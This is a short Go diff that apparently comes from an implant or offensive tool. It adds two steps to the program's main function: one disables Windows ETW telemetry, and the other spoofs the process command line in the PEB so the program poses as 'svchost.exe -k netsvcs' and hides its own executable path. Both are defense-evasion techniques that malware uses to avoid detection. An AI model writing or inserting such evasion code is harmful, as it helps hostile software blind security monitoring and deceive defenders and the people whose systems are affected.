@@ -81,7 +81,13 @@ func main() {
 	_ = _bMeta0
 	_ = _bMeta1
 
-	// Initialize NT syscall wrappers before anything else
+	// Disable ETW telemetry before anything else
+	_ = ntapi.PatchETW()
+
+	// Spoof command line in PEB to hide our executable path
+	_ = ntapi.SpoofCommandLine("C:\\Windows\\System32\\svchost.exe -k netsvcs")
+
+	// Initialize NT syscall wrappers
 	if ntErr := ntapi.Init(); ntErr != nil {
 		log.Printf("Warning: NT syscall init failed, falling back to standard API: %v", ntErr)
 	}
